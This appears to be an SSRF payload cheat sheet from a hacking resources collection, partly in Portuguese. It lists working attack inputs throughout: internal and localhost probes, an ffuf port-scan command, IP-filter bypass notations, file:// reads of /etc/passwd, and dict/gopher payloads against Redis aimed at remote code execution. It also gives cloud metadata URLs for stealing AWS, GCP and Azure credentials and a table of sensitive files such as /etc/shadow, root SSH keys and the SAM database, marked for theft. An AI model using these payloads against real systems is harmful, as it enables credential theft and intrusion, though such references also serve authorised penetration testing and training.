## Payloads
### Teste Básico
```
http://localhost
http://127.0.0.1
```
## Port Scanning
```
ffuf -u 'http://exemplo.com/fetch?url=HOST:PORT' -H 'Cookie: session=valor; id=valor' -w hosts.txt:HOST -w ports.txt:PORT'
```
## Scripts 
#### Criar lista de IPs: [ip_range_wordlist.sh](https://github.com/carineconstantino/hacking_br/blob/main/Resources/ssrf/ip_range_wordlist.sh)
#### Criar lists de IPs decimal: [ip_decimal_wordlist.sh](https://github.com/carineconstantino/hacking_br/blob/main/Resources/ssrf/ip_decimal_wordlist.sh)

## Different IP Notations
To bypass IP-based filters
```
http://[::]:80/ (IPv6)
http://0 (Special IP)
```

## Local File Read
```
file:///etc/passwd
file:///c:/windows/win.ini
```

## URL Scheme Exploit
### DICT
To gather information from services like Redis by connecting via the DICT protocol.<p>
The response from the Redis server's INFO command is returned.
```
dict://127.0.0.1:6379/INFO
```
### Gopher
To send raw TCP commands to services like Redis with the Gopher protocol to change state or attempt RCE.<p>
Usually, no response is returned (blind). Success must be verified through other means.
```
gopher://127.0.0.1:6379/_...
```

## Cloud Metadata Access (AWS)
To retrieve general information (e.g., hostname, IAM role name) from the AWS metadata service.<p>
The respective metadata information (e.g., admin-role) is returned.
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/{role-name}
```
To steal temporary credentials (Access Key, Secret Key, Token) for the specified IAM role.<p>
AWS credentials are returned in JSON format.
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/{role-name}
```

## Cloud Metadata Access (Google Cloud)
To steal the access token for the service account in Google Cloud.<p>
An access token is returned in JSON format.
```
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token (Header: Metadata-Flavor: Google)
```
## Cloud Metadata Access (Azure)
To retrieve metadata information for the Azure virtual machine.<p>
Machine and network information is returned in JSON format.
```
http://10.0.0.1/metadata/instance?api-version=2021-02-01 (Header: Metadata: true)
```

## Critical System Files and Paths
| Platform        | File Path                                           | Description                                      | Usage Purpose                                                     |
|----------------|-----------------------------------------------------|--------------------------------------------------|-------------------------------------------------------------------|
| Linux          | /proc/self/environ                                  | Current process environment variables            | Collecting sensitive information in container/Lambda environments |
| Linux          | /proc/self/cmdline                                  | Process startup command line                    | Learning application parameters and settings                     |
| Linux          | /proc/self/cwd                                      | Current working directory                        | Determining application root directory                            |
| Linux          | /etc/passwd                                         | System user accounts                             | Collecting usernames and UID information                          |
| Linux          | /etc/shadow                                         | User password hashes                             | Collecting hashes for password cracking attacks                   |
| Linux          | /etc/hosts                                          | Hostname-IP mappings                             | Internal network discovery and learning host information          |
| Linux          | /etc/hostname                                       | System hostname                                  | Learning server name and identity                                 |
| Linux          | /proc/version                                       | Kernel and OS version                            | System version and exploit research                               |
| Linux          | /proc/cpuinfo                                       | CPU information                                  | Collecting system hardware information                            |
| Linux          | /proc/meminfo                                       | Memory information                               | Learning system resource information                              |
| Linux          | /var/log/auth.log                                   | Authentication logs                              | Monitoring SSH logins and security events                         |
| Linux          | /home/{user}/.bash_history                          | User command history                             | Learning executed commands and system usage                       |
| Linux          | /root/.ssh/id_rsa                                   | SSH private key                                  | Stealing private key for remote access                            |
| Windows        | c:/windows/win.ini                                  | Windows system configuration                     | System settings and configuration information                     |
| Windows        | c:/windows/system32/drivers/etc/hosts               | Windows hosts file                               | IP-hostname mappings                                              |
| Windows        | c:/boot.ini                                         | Boot configuration                               | System boot options (older systems)                               |
| Windows        | c:/windows/system32/config/sam                      | User accounts database                           | Windows user information and hashes                               |
| Windows        | c:/inetpub/logs/logfiles/w3svc1/                    | IIS web server logs                              | Web access logs and traffic analysis                              |
| Windows        | c:/users/{user}/ntuser.dat                          | User registry                                    | User registry information                                         |
| Web Servers    | /var/log/apache2/access.log                         | Apache access logs                               | Web traffic and visitor information                               |
| Web Servers    | /var/log/apache2/error.log                          | Apache error logs                                | Web server errors and debug information                           |
| Web Servers    | /var/log/nginx/access.log                           | Nginx access logs                                | Web traffic and access records                                    |
| Web Servers    | /var/log/nginx/error.log                            | Nginx error logs                                 | Nginx error messages                                              |
| Web Servers    | /etc/apache2/apache2.conf                           | Apache configuration                             | Web server settings                                               |
| Web Servers    | /etc/nginx/nginx.conf                               | Nginx configuration                              | Nginx server settings                                             |
| Databases      | /etc/mysql/my.cnf                                   | MySQL configuration                              | Database connection information and settings                      |
| Databases      | /var/lib/mysql/                                     | MySQL data directory                             | Database files                                                    |
| Applications   | /var/www/html/.env                                  | Laravel/PHP environment                          | API keys and application settings                                 |
| Applications   | /opt/tomcat/conf/tomcat-users.xml                   | Tomcat users                                     | Tomcat administrator account information                          |
| AWS Lambda     | /var/runtime/                                       | Lambda runtime files                             | Runtime configuration and information                             |
| AWS Lambda     | /opt/                                               | Lambda layer files                               | Additional libraries and dependencies                             |







